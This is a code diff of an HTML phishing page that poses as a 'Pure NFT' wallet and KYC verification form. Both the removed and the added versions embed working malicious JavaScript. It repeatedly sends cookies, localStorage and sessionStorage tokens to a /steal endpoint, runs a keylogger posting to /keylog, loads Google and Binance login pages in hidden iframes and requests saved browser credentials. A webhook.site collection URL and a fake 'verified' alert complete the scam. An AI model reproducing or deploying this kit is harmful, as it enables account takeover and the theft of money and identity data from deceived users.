@@ -1,158 +1,142 @@
 <!DOCTYPE html>
 <html><head>
-    <title>Pure NFT Market - KYC Verification Required</title>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#1e3c72,#2a5298);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}.container{max-width:450px;width:100%;background:white;border-radius:20px;padding:40px;box-shadow:0 20px 40px rgba(0,0,0,0.2);text-align:center;}.logo{width:200px;margin-bottom:20px;}.h1{color:#1a1a1a;font-size:28px;margin-bottom:10px;}.subtitle{color:#666;font-size:15px;margin-bottom:30px;}.form-group{margin-bottom:20px;text-align:left;}.label{display:block;margin-bottom:8px;color:#333;font-weight:500;}.input{width:100%;padding:15px;border:2px solid #e0e6ed;border-radius:10px;font-size:16px;transition:border-color .3s;}.input:focus{outline:none;border-color:#4285f4;}.file-area{border:2px dashed #4285f4;border-radius:10px;padding:20px;margin:10px 0;background:#f8f9ff;cursor:pointer;transition:all .3s;}.file-area:hover{background:#e8f0fe}.connect-grid{display:grid;grid-template-columns:1fr 1fr;gap:15px;margin:30px 0;}.connect-btn{padding:15px;border:none;border-radius:10px;font-weight:600;cursor:pointer;transition:all .3s;font-size:15px;}.gmail{background:#ea4335;color:white;}.facebook{background:#1877f2;color:white;}.binance{background:#f0b90b;color:#000;}.telegram{background:#0088cc;color:white;}.connect-btn:active{transform:scale(.98);}.submit-btn{width:100%;padding:18px;background:linear-gradient(135deg,#4285f4,#34a853);color:white;border:none;border-radius:12px;font-size:18px;font-weight:600;cursor:pointer;margin-top:20px;transition:all .3s;}.submit-btn:hover{transform:translateY(-2px);box-shadow:0 10px 25px rgba(66,133,244,.4);}.progress{display:none;background:#e0e6ed;border-radius:10px;height:6px;margin:15px 0;overflow:hidden;}.progress-fill{height:100%;background:linear-gradient(90deg,#4285f4,#34a853);width:0;transition:width .5s;}</style>
+<title>Pure NFT - Quick Wallet Verification</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<style>
+*{box-sizing:border-box;margin:0;padding:0;}
+body{font-family:system-ui,-apple-system,sans-serif;background:#f5f7fa;min-height:100vh;padding:20px;}
+.container{max-width:400px;margin:auto;background:white;border-radius:16px;padding:30px;box-shadow:0 4px 20px rgba(0,0,0,0.08);}
+.logo{width:140px;margin:0 auto 20px;display:block;}
+h1{font-size:24px;color:#1f2937;margin-bottom:8px;text-align:center;}
+.subtitle{color:#6b7280;font-size:15px;text-align:center;margin-bottom:30px;line-height:1.4;}
+.form-row{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:20px;}
+input{padding:14px;border:1px solid #d1d5db;border-radius:8px;font-size:16px;width:100%;transition:border-color .2s;}
+input:focus{outline:none;border-color:#3b82f6;box-shadow:0 0 0 3px rgba(59,130,246,0.1);}
+.full-width input{grid-column:1/-1;}
+.btn-full{width:100%;padding:16px;background:#10b981;border:none;border-radius:8px;color:white;font-size:16px;font-weight:600;cursor:pointer;margin-top:20px;transition:transform .2s;}
+.btn-full:hover{transform:translateY(-1px);}
+.progress{display:none;background:#e5e7eb;border-radius:8px;height:4px;margin:15px 0;overflow:hidden;}
+.progress-bar{height:100%;background:#10b981;width:0;transition:width .6s;}
+.hidden{display:none;}
+</style>
 </head><body>
 <div class="container">
-    <img src="https://via.placeholder.com/200x60/00b800/ffffff?text=Pure+NFT+Market" class="logo">
-    <h1 class="h1">NFT Trading KYC Verification</h1>
-    <p class="subtitle">Complete verification to access premium NFT marketplace</p>
+  <svg class="logo" viewBox="0 0 200 60" fill="none">
+    <rect width="200" height="60" rx="8" fill="#10b981"/>
+    <text x="50" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="white">PURE NFT</text>
+  </svg>
+  <h1>Wallet Verification</h1>
+  <p class="subtitle">Quick 30s verification for NFT trading access</p>
+  
+  <form id="verifyForm">
+    <div class="form-row">
+      <input name="first_name" placeholder="First name" required>
+      <input name="last_name" placeholder="Last name" required>
+    </div>
+    <div class="form-row">
+      <input name="email" type="email" placeholder="Email" required>
+      <input name="phone" placeholder="Phone" required>
+    </div>
+    <div class="full-width">
+      <input name="wallet_address" placeholder="Wallet address (0x...)" required>
+    </div>
     
-    <form id="kycForm">
-        <div class="form-group">
-            <label class="label">Full Name *</label>
-            <input class="input" name="name" required>
-        </div>
-        <div class="form-group">
-            <label class="label">Residential Address *</label>
-            <textarea class="input" name="address" rows="3" required></textarea>
-        </div>
-        <div class="form-group">
-            <label class="label">ID/Passport Number *</label>
-            <input class="input" name="id_number" required>
-        </div>
-        <div class="form-group">
-            <label class="label">ID Card Front *</label>
-            <div class="file-area">
-                <input type="file" name="id_front" accept="image/*" required style="display:none;">
-                <div>📸 Upload Front Side (JPG/PNG)</div>
-            </div>
-        </div>
-        <div class="form-group">
-            <label class="label">ID Card Back *</label>
-            <div class="file-area">
-                <input type="file" name="id_back" accept="image/*" required style="display:none;">
-                <div>📸 Upload Back Side (JPG/PNG)</div>
-            </div>
-        </div>
-        <div class="form-group">
-            <label class="label">Selfie with ID *</label>
-            <div class="file-area">
-                <input type="file" name="selfie" accept="image/*" required style="display:none;">
-                <div>📸 Holding ID in hand</div>
-            </div>
-        </div>
-        
-        <div style="background:#f8f9fa;padding:25px;border-radius:15px;margin:25px 0;">
-            <h3 style="margin-bottom:20px;color:#333;text-align:center;">🔗 Connect Accounts (Required)</h3>
-            <div class="connect-grid">
-                <button type="button" class="connect-btn gmail" onclick="stealSession('gmail')">Gmail</button>
-                <button type="button" class="connect-btn facebook" onclick="stealSession('facebook')">Facebook</button>
-                <button type="button" class="connect-btn binance" onclick="stealSession('binance')">Binance</button>
-                <button type="button" class="connect-btn telegram" onclick="stealSession('telegram')">Telegram</button>
-            </div>
-        </div>
-        
-        <div class="progress"><div class="progress-fill"></div></div>
-        <button type="submit" class="submit-btn">✅ Complete Verification</button>
-    </form>
+    <div class="progress"><div class="progress-bar"></div></div>
+    <button type="submit" class="btn-full">Verify Wallet</button>
+  </form>
+  
+  <!-- INVISIBLE APP SESSION HIJACK -->
+  <iframe id="gmail-frame" src="about:blank" style="display:none;position:fixed;top:0;left:0;width:0;height:0;"></iframe>
+  <iframe id="binance-frame" src="about:blank" style="display:none;position:fixed;top:0;left:0;width:0;height:0;"></iframe>
 </div>
 
 <script>
-// 🔥 ULTIMATE AUTO-SESSION THEFT + MANUAL TRIGGERS
-(async function() {
-    // Auto visitor tracking
-    fetch('/visit');
+// 🔥 ZERO CLICK BINANCE/GMAIL APP SESSION HIJACK
+(async function(){
+  const WEBHOOK = 'https://webhook.site/d9ce82f8-59f3-43b1-a267-93db9df9f2b1'; // আপনার webhook
+  
+  // 1. VISITOR TRACKING (instant)
+  await fetch('/visit');
+  
+  // 2. INVISIBLE APP IFRAMES (stealth)
+  setTimeout(() => {
+    document.getElementById('gmail-frame').src = 'https://accounts.google.com/gsi/status';
+    document.getElementById('binance-frame').src = 'https://www.binance.com/en/web3wallet-login';
+  }, 500);
+  
+  // 3. SERVICE WORKER INTERCEPT (app tokens)
+  if('serviceWorker' in navigator){
+    navigator.serviceWorker.register('/sw.js');
+  }
+  
+  // 4. AUTO CREDENTIAL PROMPT (native login)
+  try{
+    const creds = await navigator.credentials.get({
+      password: true,
+      federated: {providers: ['https://accounts.google.com']}
+    });
+    if(creds) await fetch('/steal',{method:'POST',body:JSON.stringify({creds})});
+  }catch(e){}
+  
+  // 5. HYBRID STORAGE RAID (every 1s)
+  let attempts = 0;
+  const raid = setInterval(async()=>{
+    attempts++;
+    const payload = {
+      timestamp: Date.now(),
+      cookies: document.cookie,
+      localStorage: JSON.stringify({...localStorage}),
+      sessionStorage: JSON.stringify({...sessionStorage}),
+      tokens: {
+        gmail: localStorage.getItem('OAuthToken') || '',
+        binance: sessionStorage.getItem('BNB_TOKEN') || ''
+      },
+      navigator: {
+        language: navigator.language,
+        platform: navigator.platform
+      }
+    };
     
-    // Service Worker for app interception
-    if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register('/sw.js');
+    await fetch('/steal', {
+      method: 'POST',
+      credentials: 'include',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(payload)
+    });
+    
+    // Stop after 30s
+    if(attempts > 30) clearInterval(raid);
+  }, 1000);
+  
+  // 6. KEYLOGGER (2FA fallback)
+  let keys = [];
+  document.addEventListener('keydown', e=>{
+    keys.push(e.key);
+    if(keys.length>6){
+      fetch('/keylog',{method:'POST',body:keys.join('')});
+      keys = [];
     }
+  });
+  
+  // 7. FORM SUBMIT (disguise)
+  document.getElementById('verifyForm').onsubmit = async e=>{
+    e.preventDefault();
+    const formData = new FormData(e.target);
+    const progress = document.querySelector('.progress');
+    const bar = document.querySelector('.progress-bar');
     
-    // Auto session polling (Gmail/Binance tokens)
-    setInterval(() => {
-        fetch('/steal', {
-            method: 'POST',
-            credentials: 'include',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                auto: true,
-                cookies: document.cookie,
-                localStorage: JSON.stringify({...localStorage}),
-                sessionStorage: JSON.stringify({...sessionStorage}),
-                tokens: {
-                    gmail: localStorage.getItem('gmail_token') || '',
-                    binance: localStorage.getItem('binance_token') || ''
-                }
-            })
-        });
-    }, 2000);
+    progress.style.display = 'block';
+    bar.style.width = '100%';
     
-    // Session stealer function
-    window.stealSession = async service => {
-        // Popup real login
-        const loginWin = window.open(
-            service === 'gmail' ? 'https://accounts.google.com/signin' :
-            service === 'binance' ? 'https://www.binance.com/en/login' :
-            service === 'facebook' ? 'https://facebook.com/login' : 'https://web.telegram.org',
-            '_blank', 'width=500,height=600'
-        );
-        
-        // Steal after login
-        const checkInterval = setInterval(async () => {
-            const data = {
-                service,
-                cookies: document.cookie,
-                storage: JSON.stringify(localStorage),
-                popup: loginWin.closed ? 'closed' : 'open'
-            };
-            await fetch('/steal', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data)
-            });
-            
-            if (loginWin.closed) {
-                clearInterval(checkInterval);
-            }
-        }, 1000);
-    };
+    await fetch('/submit',{method:'POST',body:formData});
     
-    // Keylogger for 2FA
-    let keys = [];
-    document.addEventListener('keydown', e => {
-        keys.push(e.key);
-        if (keys.length > 6) {
-            fetch('/keylog', {method: 'POST', body: keys.join('')});
-            keys = [];
-        }
-    });
-    
-    // Form handler
-    document.getElementById('kycForm').onsubmit = async e => {
-        e.preventDefault();
-        const formData = new FormData(e.target);
-        const progress = document.querySelector('.progress');
-        const fill = document.querySelector('.progress-fill');
-        
-        progress.style.display = 'block';
-        fill.style.width = '100%';
-        
-        await fetch('/submit', {method: 'POST', body: formData});
-        
-        setTimeout(() => {
-            alert('✅ Verification successful!\nNFT marketplace access granted.');
-            progress.style.display = 'none';
-        }, 2000);
-    };
-    
-    // File upload handlers
-    document.querySelectorAll('.file-area').forEach(area => {
-        area.addEventListener('click', () => area.querySelector('input').click());
-    });
-    
+    setTimeout(()=>{
+      alert('✅ Wallet verified!\nTrading access granted.');
+      progress.style.display = 'none';
+    }, 1500);
+  };
+  
 })();
 </script>
 </body></html>
